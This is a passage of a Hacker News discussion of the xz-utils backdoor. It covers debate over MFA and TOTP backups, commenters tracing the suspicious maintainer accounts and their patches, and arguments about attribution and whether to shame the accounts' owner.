of attestation, but the way Apple at least do them means Apple users won't have attestation, so most services won't require attestation. SahAssar 7 hours agorootparentprevPassword managers are adding support (as in they control the keys) and I've used my yubikeys as \"passkeys\" (with the difference that I can't autofill the username). It's a good spec. I wish more people who spread FUD about it being a \"tech-giant\" only thing would instead focus on the productive things like demanding proper import/export between providers. reply apitman 10 hours agorootparentprevhttps://xkcd.com/538/ reply EasyMark 5 hours agorootparentprevthey might not have been playing the long con. maybe approached by actors willing to pay them a lot of money to try and slip in a back door. I'm sure a deep dive into code contributions would clear that up for anyone familiar with the code base and some free time. reply bobba27 1 hour agorootparentThey did fuck up quite a bit though. They injected their payload before they checked if oss-fuzz or valgrind or ... would notice something wrong. That is sloppy and should have been anticipated and addressed BEFORE activating the code. Anyway. This team got caught. What are the odds that this state-actor that did this, that this was the only project / team / library that they decided to attack? reply bobba27 1 hour agorootparentprevThis is a state sponsored event. Pretty poorly executed though as they were tweaking and modifying things in their and other tools after the fact though. As a state sponsored project. What makes you think this is their only project and that this is a big setback? I am paranoid myself to think yesterdays meeting went like : \"team #25 has failed/been found out. Reallocate resources to the other 49 teams.\" reply the8472 13 hours agorootparentprevgithub already mandates MFA for members of important projects reply rvense 12 hours agorootparentDoesn't it mandate it for everyone? I don't use it anymore and haven't logged in since forever, but I think I got a series of e-mails that it was being made mandatory. reply ryukoposting 11 hours agorootparentIt will soon. I think I have to sort it out before April 4. My passwords are already >20 random characters, so I wasn't going to do it until they told me to. reply pabs3 5 minutes agorootparentIf you are using pass to store those, check out pass-otp and browserpass, since GitHub still allows TOTP for MFA. pass-otp is based on oathtool, so you can do it more manually too if you don't use pass. loeg 11 hours agorootparentprevIt mandates it for everyone. I'm locked out of Github because fuck that. reply illusive4080 10 hours agorootparentWhy opposed to MFA? Source code is one of the most important assets in our realm. reply hobobaggins 9 hours agorootparentMost people will have to sync their passwords (generally strong and unique, given that it's for github) to the same device where their MFA token is stored, rendering it (almost) completely moot, but at a significantly higher risk of permanent access loss (depending on what they do with the reset codes, which, if compromised, would also make MFA moot.) (a cookie theft makes it all moot as well.) The worse part is that people think they're more protected, when they're really not. reply Dylan16807 9 hours agorootparentBringing everyone up to the level of \"strong and unique password\" sounds like a huge benefit. Even if your \"generally\" is true, which I doubt, that leaves a lot of gaps. reply jjav 7 hours agorootparentprev> Why opposed to MFA? Source code is one of the most important assets in our realm. Because if you don't use weak passwords MFA doesn't add value. I do recommend MFA for most people because for most people their password is the name of their dog (which I can look up on social media) followed by \"1!\" to satisfy the silly number and special character rules. So yes please use MFA. But if your (like my) passwords are 128+bits out of /dev/random, MFA isn't adding value. reply admax88qqq 7 hours agorootparentSure it is. If your system ever gets keylogged and somebody gets your password you are compromised With MFA even if somebody has your password if they don't have your physical authenticator too then you're relatively safe. reply ndriscoll 5 hours agorootparentIf you have a keylogger, they can also just take your session cookie/auth tokens or run arbitrary commands while you're logged in. MFA does nothing if you're logging into a service on a compromised device. reply mr_mitm 3 hours agorootparentKeyloggers can be physically attached to your keyboard. There could also be a vulnerability in the encryption of wireles keyboards. Certificate-based MFA is also phishing resistant, unlike long, random, unique passwords. There are plenty of scenarios where MFA is more secure than just a strong password. reply RaisingSpear 1 hour agorootparentBut password managers typically don't send keyboard commands to fill in a password, so a physical device would be useless. > There are plenty of scenarios where MFA is more secure than just a strong password. And how realistic are they? Or are they just highly specific scenarios where all the stars must align, and are almost never going to happen? reply mr_mitm 10 minutes agorootparentI don't think phishing is such an obscure scenario. The point is also that you as an individual can make choices and assess risk. As a large service provider, you will always have people who reuse passwords, store them unencrypted, fall for phishing, etc. There is a percentage of users that will get their account compromised because of bad password handling which will cost you, and by enforcing MFA you can decrease that percentage, and if you mandate yubikeys or something similar the percentage will go to zero. heyoni 5 hours agorootparentprevSession keys expire and can be scoped to do anything except reset password, export data, etc…that’s why you’ll sometimes be asked to login again on some websites. reply ndriscoll 5 hours agorootparentIf you're on a service on a compromised device, you have effectively logged into a phishing site. They can pop-up that same re-login page on you to authorize whatever action they're doing behind the scenes whenever they need to. They can pretend to be acting wonky with a \"your session expired log in again\" page, etc. This is part of why MFA just to log in is a bad idea. It's much more sensible if you use it only for sensitive actions (e.g. changing password, authorizing a large transaction, etc.) that the user almost never does. But you need everyone to treat it that way, or users will think it's just normal to be asked to approve all the time. reply snnn 3 hours agorootparentSome USB keys have a LCD screen on it to prevent that. You can comprise the computer that the key was inserted to, but you cannot comprise the key. If you see the things messages shows up on your computer screen differs from the messages on the key, you reject the auth request. reply throwaway2990 5 hours agorootparentprevHaha yes they do. Everyone stores their 2fa in 1Password so once that’s stolen by a key longer they’re fucked. reply samatman 7 hours agorootparentprevThe slogan is \"something you know and something you have\", right? I don't have strong opinions about making it mandatory, but I turned on 2FA for all accounts of importance years ago. I use a password manager, which means everything I \"know\" could conceivably get popped with one exploit. It's not that much friction to pull out (or find) my phone and authenticate. It only gets annoying when I switch phones, but I have a habit of only doing that every four years or so. You sound like you know what you're doing, that's fine, but I don't think it's true that MFA doesn't add security on average. reply jjav 7 hours agorootparent> It only gets annoying when I switch phones Right. I don't ever want to tie login to a phone because phones are pretty disposable. > I don't think it's true that MFA doesn't add security on average You're right! On average it's better, because most people have bad password and/or reuse them in more than one place. So yes MFA is better. But if your password is already impossible to guess (as 128+ random bits are) then tacking on a few more bytes of entropy (the TOTP seed) doesn't do much. reply satokema 6 hours agorootparentThose few bits are the difference between a keylogged password holder waltzing in and an automated monitor noticing that someone is failing the token check and locking the account before any damage occurs. reply StillBored 4 hours agorootparentI think your missing parents point, both are just preshared keys, one has some additional fuzz around it so that the user in theory isn't themselves typing the same second key in all the time, but much of that security is in keeping the second secret in a little keychain device that cannot itself leak the secret. Once people put the seeds in their password managers/phones/etc its just more data to steal. Plus, the server/provider side remains a huge weak point too. And the effort of enrolling/giving the user the initial seed is suspect. This is why the FIDO/hardware passkeys/etc are so much better because is basically hardware enforced two way public key auth, done correctly there isn't any way to leak the private keys and its hard has hell to MITM. Which is why loss of the hw is so catastrophic. Most every other MFA scheme is just a bit of extra theater. reply jjav 3 hours agorootparent> both are just preshared keys Exactly, that's it. Two parties have a shared secret of, say 16 bytes total, upon which authentication depends. They could have a one byte long password but a 15 byte long shared secret used to compute the MFA code. The password is useless but the MFA seed is unguessable. Maybe have no password at all (zero length) and 16 byte seed. Or go the other way and a 16 byte password and zero seed. In terms of an attacker brute forcing the keyspace, it's always the same, 16 bytes. We're basically saying (and as a generalization, this is true) that the password part is useless since people will just keep using their pets name, so let's put the strenght on the seed side. Fair enough, that's true. But if you're willing to use a strong unique password then there's no real need. (As to keyloggers, that's true, but not very interesting. If my machine is already compromised to the level that it has malicious code running logging all my input, it can steal both the passwords and the TOTP seeds and all the website content and filesystem content and so on. Game's over already.) > This is why the FIDO/hardware passkeys/etc are so much better Technically that's true. But in practice, we now have a few megacorporations trying to own your authentication flow in a way that introduces denial of service possibilities. I must control my authentication access, not cede control of it to a faceless corporation with no reachable support. I'd rather go back to using password123 everywhere. reply 12_throw_away 6 hours agorootparentprev> But if your (like my) passwords are 128+bits out of /dev/random, MFA isn't adding value. no. a second factor of authentication is completely orthogonal to password complexity. reply loeg 9 hours agorootparentprevIt's inconvenient, SMS 2FA is arguably security theater, and redundant with a real password manager. Hopefully Passkeys kills 2FA for most services. reply Hawxy 8 hours agorootparentFYI github already supports using passkeys as a combined login/2FA source. I haven't used my 2FA codes for a while now. reply userbinator 9 hours agorootparentprevFreedom is far more important. reply illusive4080 9 hours agorootparentBut you can use any totp authenticator. The protocol is free and open. reply userbinator 9 hours agorootparentIt's more to make the point that \"no means no.\" An act of protest. (I have written a TOTP implementation myself. I do not have a GH account, and likely never will.) reply Dylan16807 9 hours agorootparentIt's ridiculous to say \"no means no\" about not wanting to use a password to get an account, right? What makes TOTP different from a password in terms of use or refusal? reply ndriscoll 7 hours agorootparentBrowsers don't save the TOTP seed and auto fill it for you for one, making it much less user friendly than a password in practice. The main problem I have with MFA is that it gets used too frequently for things that don't need that much protection, which from my perspective is basically anything other than making a transfer or trade in my bank/brokerage. Just user-hostile requiring of manual action, including finding my phone that I don't always keep on me. It's also often used as a way to justify collecting a phone number, which I wouldn't even have if not for MFA. reply creatonez 9 hours agorootparentprevShould you have the freedom to put in a blank password, too? reply voidz 2 hours agorootparentMy password is a single 'a'. Nobody will ever guess that one. reply Freedom2 3 hours agorootparentprevThey have the freedom to request whatever authentication method they want. reply LtWorf 8 hours agorootparentprevMy source code is important to others but not to me. I have backups. but 2FA is annoying to me. It's very easy to permanently lose accounts when 2FA is in use. If I lose my device my account is gone for good. Tokens from github never expire, and can do everything via API without ever touching 2FA, so it's not that secure. reply Brian_K_White 8 hours agorootparent\"If I lose my device my account is gone for good.\" Incorrect, unless you choose not to record your seeds anywhere else, which is not a 2fa problem. 2fa is in the end nothing more than a 2nd password that just isn't sent over the wire when used. You can store a totp seed exactly the same as a password, in any form you want, anywhere you want, and use on a brand new device at any time. reply LtWorf 3 hours agorootparent> Incorrect, unless you choose not to record your seeds anywhere else, which is not a 2fa problem. You know google authenticator app introduced a backup feature less than 1 year ago right? You know phones break all the time right? reply Brian_K_White 3 hours agorootparentYou know google authenticator doesn't matter right? You know you could always copy your totp seeds since day one regardless of which auth app or it's features or limits right? You know that a broken device does not matter at all, because you have other copies of your seeds just like the passwords, right? When I said they are just another password, I was neither lying nor in error. I presume you can think of all the infinite ways that you would keep copies of a password so that when your phone or laptop with keepassxc on it breaks, you still have other copies you can use. Well when I say just like a password, that's what I mean. It's just another secret you can keep anywhere, copy 50 times in different password managers or encrypted files, print on paper and stick in a safe, whatever. Even if some particular auth app does not provide any sort of manual export function (I think google auth did have an export function even before the recent cloud backup, but let's assume it didn't), you can still just save the original number the first time you get it from a qr code or a link. You just had to know that that's what those qr codes are doing. They aren't single-use, they are nothing more than a random secret which you can keep andbcopy and re-use forever, exactly the same as a password. You can copy that number into any password manager or plain file or whatever you want just like a password, and then use it to set up the same totp on 20 different apps on 20 different devices, all working at the same time, all generating valid totp codes at the same time, destroy them all, buy a new phone, retrieve any one of your backup keepass files or printouts, and enter them into a fresh app on a fresh phone and get all your totp fully working again. You are no more locked out than by having to reinstall a password manager app and access some copy of your password db to regain the ordinary passwords. The only difference from a password is, the secret is not sent over the wire when you use it, something derived from it is. Google authenticators particular built in cloud copy, or lack of, doesn't matter at all, and frankly I would not actually use that particular feature or that particular app. There are lots of totp apps on all platforms and they all work the same way, you enter the secret give it a name like your bank or whatever, select which algorithm (it's always the default, you never have to select anything) and instantly the app starts generating valid totp codes for that account the same as your lost device. Aside from saving the actual seed, let's say you don't have the original qr code any more (you didn't print it or screenshot it or right-click save image?) there is yet another emergency recovery which is the 10 or 12 recovery passwords that every site gives you when you first set up totp. You were told to keep those. They are special single-use passwords that get you in without totp, but each one can only be used once. So, you are a complete space case and somehow don't have any other copiesbof your seeds in any form, including not even simple printouts or screenshots of the original qr code, STILL no problem. You just burn one of your 12 single-use emergency codes, log in, disable and re-enable totp on that site, get a new qr code and a new set of emergency codes. Your old totp seed and old emergency codes no longer work so thow those out. This time, not only keep the emergency codes, also keep the qr code, or more practical, just keep the seed value in the qr code. It's right there in the url in the qr code. Sometimes they even display the seed value itself in plain text so that you can cut & paste it somewhere, like into a field in keepass etc. In fact keepass apps on all platforms also will not only store the seed value but display the current totp for it just like a totp app does. But a totp app is a more convenient. And for proper security, you technically shouldn't store both the password and the totp seed for an account in the same place, so that if someone gains access to one, they don't gain access to both. That's inconvenient but has to be said just for full correctness. I think most sites do a completely terrible job of conveying just what totp is when you're setting it up. They tell you to scan a qr code but they kind of hide what that actually is. They DO all explain about the emergency codes but really those emergency codes are kind of stupid. If you can preserve a copy of the emergency codes, then you can just as easily preserve a copy of the seed value itself exactly the same way, and then, what's the point of a hanful of single-use emergency passwords when you can just have your normal fully functional totp seed? Maybe one use for the emergency passwords is you could give them to different loved ones instead of your actual seed value? Anyway if they just explained how totp basically works, and told you to keep your seed value instead of some weird emergency passwords, you wouldn't be screwed when a device breaks, and you would know it and not be worried about it. Now, if, because of that crappy way sites obscure the process, you currently don't have your seeds in any re-usable form, and also don't have your emergency codes, well then you will be F'd when your phone breaks. But that is fixable. Right now while it works you can log in to each totp-enabled account, and disable & reenable totp to generate new seeds, and take copies of them this time. Set them up on some other device just to see that they work. Then you will no longer have to worry about that. reply rst 9 hours agorootparentprevWhich helps with some kinds of threats, but not all. It keeps someone from pretending to be the maintainer -- but if an actual maintainer is compromised, coerced, or just bad from the start and biding their time, they can still do whatever they want with full access rights. reply the8472 9 hours agorootparentYou probably should have replied that to the GP, not me. I only clarified that what they were suggesting already is the case. reply LtWorf 8 hours agorootparentprevAs I said recently in a talk I gave, 2FA as implemented by pypy or github is meaningless, when in fact all actions are performed via tokens that never expire, that are saved inside a .txt file on the disk. reply heyoni 5 hours agorootparentPasswords have full scope of permission while session tokens can be limited. reply CapstanRoller 7 hours agorootparentprevDoesn't GH explicitly warn against using non-expiring tokens? reply yrro 6 hours agorootparentI wonder what the point is, I don't remember GitHub warning me that I've used the se SSH key for years... reply LtWorf 3 hours agorootparentprevAnd? reply __s 14 hours agorootparentprevThis seems like a great way to invest in supporting open source projects in meantime if these projects are being used by these actors. Just have to maintain an internal fork without the backdoors Maybe someone can disrupt the open source funding problem by brokering exploit bounties /s reply moritonal 10 hours agorootparentprevWarning, drunk brain talking. But a LLM driven email based \"collaborator\" could play a very long gMw adding basic features to a code made whilst earning trust backed by a generated online presence. My money is on a resurgance in the Web of Trust. reply jnxx 10 hours agorootparentThe web of trust is a really nice idea, but it works badly against that kind of attacks. Just consider that in the real world, most living people (all eight billions) are linked by only six degrees of separation. It really works, for code and for trusted social relations (like \"I lend you 100 bucks and you pay me them back when you get your salary\") mostly when you know the code author in person. This is also not a new insight. In the beginning of the naughties, there was a web site named kuro5hin.org, which experiemented with user ratings and trust networks. It turned out impossible to prevent take-overs. reply groby_b 9 hours agorootparentIIRC, kuro5hin and others all left out a crucial step in the web-of-trust approach: There were absolutely no repercussions when you extended trust to somebody who later turned out to be a bad actor. It considers trust to be an individual metric instead of leaning more into the graph. (There are other issues, e.g. the fact that \"trust\" isn't a universal metric either, but context dependent. There are folks whom you'd absolutely trust to e.g. do great & reliable work in a security context, but you'd still not hand them the keys to your car) At least kuro5hin modeled a degradation of trust over time, which most models still skip. It'd be a useful thing, but we have a long way to go before there's a working version. reply vintermann 1 hour agorootparentprevThere were experiments back in the day. Slashdot had one system based on randomly assigned moderation duty which worked pretty great actually, except that for the longest time you couldn't sort by it. Kuro5hin had a system which didn't work at all, as you mentioned. But the best was probably Raph Levien's Advogato. That had a web of trust system which actually worked. But had a pretty limited scope (open source devs). Now everyone just slaps an upvote/downvote button on and calls it a day. reply w4ffl35 10 hours agorootparentprevClearly a human is even better at it. reply cyanydeez 10 hours agorootparentprevState actors have equaly long horizons to compromise reply llmblockchain 10 hours agorootparentprevState level actor? China? reply ametrau 14 hours agorootparentprevProbably a state actor. You can look far into the future when you’re working for the party. reply DrewRWx 13 hours agorootparentAnd that long term perspective could be used constructively instead! reply calvinmorrison 10 hours agorootparentprevWhich like, also wouldn't be totally weird if I found out that the xz or whatever library maintainer worked for the DoE as a researcher? I kind of expect governments to be funding this stuff. reply CanaryLayout 3 hours agorootparentFrom what I read on masto, the original maint had personal life breakdown, etc. Their interest in staying as primary maint is gone. This is a very strong argument for FOSS to pick up the good habit of ditching/un-mainlining projects where they are sitting around for state actors to volunteer injecting commits to, and dep-stripping active projects from this cruft. Who wants to maintain on a shitty compression format? Someone who is dephunting, it turns out. Okay so your pirate-torrent person needs liblzma.so Offer it in the scary/oldware section of the package library that you need to hunt down the instructions to turn on. Let the users see that it's marked as obsolete, enterprises will see that it should go on the banlist. reply soraminazuki 3 hours agorootparentUm, what? This incident is turning into such a big deal because xz is deeply ingrained as a core dependency in the software ecosystem. It's not an obscure tool for \"pirates.\" reply userbinator 12 hours agoparentprevbecause of it's \"great new features\" \"great\" for whom? I've seen enough of the industry to immediately feel suspicious when someone uses that sort of phrasing in an attempt to persuade me. It's no different from claiming a \"better experience\" or similar. reply LtWorf 8 hours agorootparentI made a library where version 2 is really really much faster than version 1. I'd want everyone to just move to version 2. reply Brian_K_White 8 hours agorootparentBut then you are saying a specific great new feature, performance, and not just the claim and concept performance, but numbers. reply LtWorf 3 hours agorootparentI'm sure they actually had new features… reply CanaryLayout 3 hours agorootparentYeah... RISCV routine was put in, then some binary test files were added later that are probably now suspect. don't miss out on the quality code, like the line that has: i += 4 - 2; https://git.tukaani.org/?p=xz.git;a=commitdiff;h=50255feeaab... reply gamer191 2 hours agorootparent> some binary test files were added later that are probably now suspect That's confirmed From https://www.openwall.com/lists/oss-security/2024/03/29/4: > The files containing the bulk of the exploit are in an obfuscated form in > tests/files/bad-3-corrupt_lzma2.xz > tests/files/good-large_compressed.lzma > committed upstream. They were initially added in > https://github.com/tukaani-project/xz/commit/cf44e4b7f5dfdbf... reply Brian_K_White 2 hours agorootparentprevWhat are they specifically? I don't know how you can be missing the essence of the problem here or that comments point. Vague claims are meaningless and valueless and are now even worse than that, they are a red flag. Please don't tell me that you would accept a pr that didn't explain what it did, and why it did it, and how it did it, with code that actually matched up with the claim, and was all actually something you wanted or agreed was a good change to your project. Updating to the next version of a library is completely unrelated. When you update a library, you don't know what all the changes were to the library, _but the librarys maintainers do_, and you essentially trust that librarys maintainers to be doing their job not accepting random patches that might do anything. Updating a dependency and trusting a project to be sane is entirely a different prospect from accepting a pr and just trusting that the submitter only did things that are both well intentioned and well executed. If you don't get this then I for sure will not be using or trusting your library. reply SilasX 9 hours agorootparentprevYou can find more examples of that kind of puffer if you go to a website's cookie consent pop-up and find the clause after \"we use cookies to...\". reply transcriptase 6 hours agorootparentI’ve long thought that those “this new version fixes bugs and improves user experience” patch notes that Meta et al copy and paste on every release shouldn’t be permitted. reply mongol 11 hours agoparentprevInteresting that one of the commits commented on update of the test file that it was for better reproducibility for having been generated by a fixed random seed (although how goes unmentioned). For the future, random test data better be generated as part of the build, rather than being committed as opaque blobs... reply smeehee 14 hours agoparentprevDebian have reverted xz-utils (in unstable) to 5.4.5 – actual version string is “5.6.1+really5.4.5-1”. So presumably that version's safe; we shall see… reply xorcist 8 hours agorootparentIs that version truly vetted? \"Jia Tan\" has been the official maintainer since 5.4.3, could have pushed code under any other pseudonym, and controls the signing keys. I would have felt better about reverting farther back, xz hasn't had any breaking changes for a long time. reply tobias2014 8 hours agorootparentIt looks like this is being discussed, with a complication of additional symbols that were introduced https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1068024 reply binkHN 5 hours agorootparentThanks for this! I found this URL in the thread very interesting! https://www.nongnu.org/lzip/xz_inadequate.html reply mehdix 3 hours agorootparentIt is an excellent technical write-up and yet again another testimonial to the importance of keeping things simple. reply userbinator 2 hours agorootparentThe other comments here showing that the backdoor was a long-term effort now make me wonder just how long of an effort it was... reply rnmkr 8 hours agorootparentprevIt's not only that account, other maintainer has been pushing the same promotion all over the place. reply kzrdude 1 hour agorootparentprevThere are suggestions to roll back further reply kapouer 12 hours agoparentprevGithub accounts of both xz maintainers have been suspended. reply miduil 12 hours agorootparentNot true, the original author wasn't suspended: https://github.com/Larhzu https://github.com/JiaT75 was suspended for a moment, but isn't anymore? reply FridgeSeal 7 hours agorootparentGitHub’s UI has been getting notoriously bad for showing consistent and timely information lately, could be an issue stemming from that. reply justinclift 5 hours agorootparentYeah. Had a weird problem last week where GitHub was serving old source code from the raw url when using curl, but showing the latest source when coming from a browser. Super frustrating when trying to develop automation. :( reply boutique 12 hours agorootparentprevBoth are suspended for me. Check followers on both accounts, both have a suspended pill right next to their names. reply miduil 11 hours agorootparentAh, thanks for correcting me there - really weird that this isn't visible from the profile itself. Not even from the organization. The following page for each other show both accounts suspended indeed. https://github.com/Larhzu?tab=following https://github.com/JiaT75?tab=following reply fargle 10 hours agorootparentprevgithub should add a badge for \"inject backdoor into core open source infrastructure\" reply formerly_proven 16 hours agoparentprevI think this has been in the making for almost a year. The whole ifunc infrastructure was added in June 2023 by Hans Jansen and Jia Tan. The initial patch is \"authored by\" Lasse Collin in the git metadata, but the code actually came from Hans Jansen: https://github.com/tukaani-project/xz/commit/ee44863ae88e377... > Thanks to Hans Jansen for the original patch. https://github.com/tukaani-project/xz/pull/53 There were a ton of patches by these two subsequently because the ifunc code was breaking with all sorts of build options and obviously caused many problems with various sanitizers. Subsequently the configure script was modified multiple times to detect the use of sanitizers and abort the build unless either the sanitizer was disabled or the use of ifuncs was disabled. That would've masked the payload in many testing and debugging environments. The hansjans162 Github account was created in 2023 and the only thing it did was add this code to liblzma. The same name later applied to do a NMU at Debian for the vulnerable version. Another \"\" account (which only appears here, once) then pops up and asks for the vulnerable version to be imported: https://www.mail-archive.com/search?l=debian-bugs-dist@lists... reply bed99 13 hours agorootparent1 week ago \"Hans Jansen\" user \"hjansen\" was created in debian and opened 8 PRs including the upgrade to 5.6.1 to xz-utils From https://salsa.debian.org/users/hjansen/activity Author: Hans Jansen- [Debian Games / empire](https://salsa.debian.org/games-team/empire): opened merge request \"!2 New upstream version 1.17\" - March 17, 2024 - [Debian Games / empire](https://salsa.debian.org/games-team/empire): opened merge request \"!1 Update to upstream 1.17\" - March 17, 2024 - [Debian Games / libretro / libretro-core-info](https://salsa.debian.org/games-team/libretro/libretro-core-i...): opened merge request \"!2 New upstream version 1.17.0\" - March 17, 2024 - [Debian Games / libretro / libretro-core-info](https://salsa.debian.org/games-team/libretro/libretro-core-i...): opened merge request \"!1 Update to upstream 1.17.0\" - March 17, 2024 - [Debian Games / endless-sky](https://salsa.debian.org/games-team/endless-sky): opened merge request \"!6 Update upstream branch to 0.10.6\" - March 17, 2024 - [Debian Games / endless-sky](https://salsa.debian.org/games-team/endless-sky): opened merge request \"!5 Update to upstream 0.10.6\" - March 17, 2024 - [Debian / Xz Utils](https://salsa.debian.org/debian/xz-utils): opened merge request \"!1 Update to upstream 5.6.1\" - March 17, 2024 reply bombcar 13 hours agorootparentThat looks exactly like what you'd want to see to disguise the actual request you want, a number of pointless upstream updates in things that are mostly ignored, and then the one you want. reply bed99 12 hours agorootparentagree reply zb3 16 hours agorootparentprevAlso I saw this hans jansen user pushing for merging the 5.6.1 update in debian: https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1067708 reply hxelk1 12 hours agorootparentFrom: krygorin4545To: \"1067708@bugs.debian.org\"Cc: \"sebastian@breakpoint.cc\" , \"bage@debian.org\"Subject: Re: RFS: xz-utils/5.6.1-0.1 [NMU] -- XZ-format compression utilities Date: Tue, 26 Mar 2024 19:27:47 +0000 Also seeing this bug. Extra valgrind output causes some failed tests for me. Looks like the new version will resolve it. Would like this new version so I can continue work. -- Wow. (Edited for clarity.) reply amluto 11 hours agorootparentprevWow, what a big pile of infrastructure for a non-optimization. An internal call via ifunc is not magic — it’s just a call via the GOT or PLT, which boils down to function pointers. An internal call through a hidden visibility function pointer (the right way to do this) is also a function pointer. The even better solution is a plain old if statement, which implements the very very fancy “devirtualization” optimization, and the result will be effectively predicted on most CPUs and is not subject to the whole pile of issue that retpolines are needed to work around. reply snvzz 6 hours agorootparentprev>Hans Jansen and Jia Tan Are they really two people conspiring? Unless proven otherwise, it is safe to assume one is just a pseudonym alias of the other. reply EasyMark 4 hours agorootparentor possibly just one person acting as two, or a group of people? reply bluecheese33 15 hours agorootparentprev> because the ifunc code was breaking with all sorts of build options and obviously caused many problems with various sanitizers for example, https://github.com/google/oss-fuzz/pull/10667 reply zb3 15 hours agorootparentprevAlso I see this PR: https://github.com/tukaani-project/xz/pull/64 reply formerly_proven 1 hour agorootparentprevMake it two years. Jia Tan getting maintainer access looks like it is almost certainly to be part of the operation. Lasse Colling mentioned multiple times how Jia has helped off-list and to me it seems like Jia befriended Lasse as well (see how Lasse talks about them in 2023). Also the pattern of astroturfing dates back to 2022. See for example this thread where Jia, who has helped at this point for a few weeks, posts a patch, and a @protonmail (jigarkumar17) user pops up and then bumps the thread three times(!) lamenting the slowness of the project and pushing for Jia to get commit access: https://www.mail-archive.com/xz-devel@tukaani.org/msg00553.h... Naturally, like in the other instances of this happening, this user only appears once on the internet. reply thayne 5 hours agoparentprevDo you know if it was actually the commit author, of if their commit access was compromised? reply bpye 5 hours agorootparentIf it was a compromise it also included the signing keys as the release tarball was modified vs the source available on GitHub. reply drazk 10 hours agoparentprevAfter reading the original post by Andres Freund, https://www.openwall.com/lists/oss-security/2024/03/29/4, his analysis indicates that the RSA_public_decrypt function is being redirected to the malware code. Since RSA_public_decrypt is only used in the context of RSA public key - private key authentication, can we reasonably conclude that the backdoor does not affect username-password authentication? reply LispSporks22 4 hours agoparentprevNice. I worked on a Linux disto when I was a wee lad and all we did was compute a new md5 and ship it. reply api 11 hours agoparentprevI’m surprised there isn’t way more of this stuff. The supply chain is so huge and therefore represents so much surface area. reply SoftTalker 7 hours agorootparentThere probably is. Way more than anyone knows. I bet every major project on github is riddled with state actors. reply gigatexal 16 hours ago [flagged]parentprevnext [9 more] Name and shame this author. They should never be allowed anywhere near any open projects ever again. reply 0xbadcafebee 16 hours agorootparentPlease don't? 1. You don't actually know what has been done by whom or why. You don't know if the author intended all of this, or if their account was compromised. You don't know if someone is pretending to be someone else. You don't know if this person was being blackmailed, forced against their will, etc. You don't really know much of anything, except a backdoor was introduced by somebody. 2. Assuming the author did do something maliciously, relying on personal reputation is bad security practice. The majority of successful security attacks come from insiders. You have to trust insiders, because someone has to get work done, and you don't know who's an insider attacker until they are found out. It's therefore a best security practice to limit access, provide audit logs, sign artifacts, etc, so you can trace back where an incursion happened, identify poisoned artifacts, remove them, etc. Just saying \"let's ostracize Phil and hope this never happens again\" doesn't work. 3. A lot of today's famous and important security researchers were, at one time or another, absolute dirtbags who did bad things. Human beings are fallible. But human beings can also grow and change. Nobody wants to listen to reason or compassion when their blood is up, so nobody wants to hear this right now. But that's why it needs to be said now. If someone is found guilty beyond a reasonable doubt (that's really the important part...), then name and shame, sure, shame can work wonders. But at some point people need to be given another chance. reply Kwpolska 1 hour agorootparentIt is reasonable to consider all commits introduced by the backdoor author untrustworthy. This doesn't mean all of it is backdoored, but if they were capable of introducing this backdoor, their code needs scrutiny. I don't care why they did it, whether it's a state-sponsored attack, a long game that was supposed to end with selling a backdoor for all Linux machines out there for bazillions of dollars, or blackmail — this is a serious incident that should eliminate them from open-source contributions and the xz project. There is no requirement to use your real name when contributing to open source projects. The name of the backdoor author (\"Jia Tan\") might be fake. If it isn't, and if somehow they are found to be innocent (which I doubt, looking at the evidence throughout the thread), they can create a new account with a new fake identity. reply gigatexal 15 hours agorootparentprev100% fair -- we don't know if their account was compromised or if they meant to do this intentionally. If it were me I'd be doing damage control to clear my name if my account was hacked and abused in this manner. Otherwise if I was doing this knowing full well what would happen then full, complete defederation of me and my ability to contribute to anything ever again should commence -- the open source world is too open to such attacks where things are developed by people who assume good faith actors. reply gigatexal 15 hours agorootparentupon further reflection all 3 of your points are cogent and fair and valid. my original point was a knee-jerk reaction to this. :/ reply Biganon 11 hours agorootparentYour being able to reflect upon it and analyze your own reaction is rare, valuable and appreciated reply Lichtso 16 hours agorootparentprevThey might have burnt the reputation built for this particular pseudonym but what is stopping them from doing it again? They were clearly in it for the long run. reply jethro_tell 16 hours agorootparentYou're assuming that it's even a single person, it's just a gmail address and an avatar with a j icon from a clip art thing. reply Lichtso 15 hours agorootparentI literally said \"they\", I know, I know, in English that can also be interpreted as a gender unspecific singular. Anyways, yes it is an interesting question whether he/she is alone or they are a group. Conway's law probably applies here as well. And my hunch in general is that these criminal mad minds operate individually / alone. Maybe they are hired by an agency but I don't count that as a group effort. reply yieldcrv 16 hours agoparentprevI wonder who the target was! reply juliusdavies 5 hours agorootparentEvery Linux box inside AWS, Azure, and GCP and other cloud providers that retains the default admin sudo-able user (e.g., “ec2”) and is running ssh on port 22. I bet they intended for their back door to eventually be merged into the base Amazon Linux image. reply swagmoney1606 4 hours agorootparentprevProbably less of an individual and more of an exploit to sell. reply KingOfCoders 15 hours agoparentprevSleeper. reply coding123 16 hours agoparentprevnext [8 more] [flagged] zb3 16 hours agorootparentNot sure why are people downvoting you... it's pretty unlikely that various Chinese IoT companies would just decide it's cool to add a backdoor, which clearly implies that no matter how good their intentions are, they simply might have no other choice. reply gpm 16 hours agorootparentThere are roughly speaking two possibilities here: 1. His machine was compromised, he wasn't at fault past having less than ideal security (a sin we are all guilty of). His country or origin/residence is of no importance and doxing him isn't fair to him. 2. This account was malicious. There's no reason we should believe that the identity behind wasn't fabricated. The country of origin/residence is likely falsified. In neither case is trying to investigate who he is on a public forum likely to be productive. In both cases there's risk of aiming an internet mob at some innocent person who was 'set up'. reply rjzzleep 15 hours agorootparentThe back door is in the upstream GitHub tarball. The most obvious way to get stuff there is by compromising an old style GitHub token. The new style GitHub tokens are much better but it’s somewhat intransparent what options you need. Most people also don’t use expiring tokens. The authors seems to have a lot of oss contributions, so probably an easy target to choose. reply zb3 16 hours agorootparentprevWhy do you exclude the possibility that this person was forced to add this at gunpoint? reply encoderer 16 hours agorootparentYes exactly this. How do people think state actors have all those 0 day exploits. Excellent research? No! They are adding them themselves! reply noncoml 16 hours agorootparentprevBecause it’s naive to think that the owner of the account used his real identity. reply zb3 16 hours agorootparentBut my point is that people living in China might be \"forced\" to do such things, so we unfortunately can't ignore the country. Of course, practically this is problematic since the country can be faked reply sorokod 16 hours agoparentprevnext [3 more] [flagged] matheusmoreira 16 hours agorootparentDon't blame the guy. Could have happened to anyone. Even you. reply sorokod 14 hours agorootparentnext [2 more] [flagged] dang 10 hours agorootparentIt's an uncharitable summary that comes across as a personal attack, which is not allowed in HN comments. reply Jommi 14 hours agoparentprevthe account was either sold or stolen reply move-on-by 16 hours agoprevFascinating. 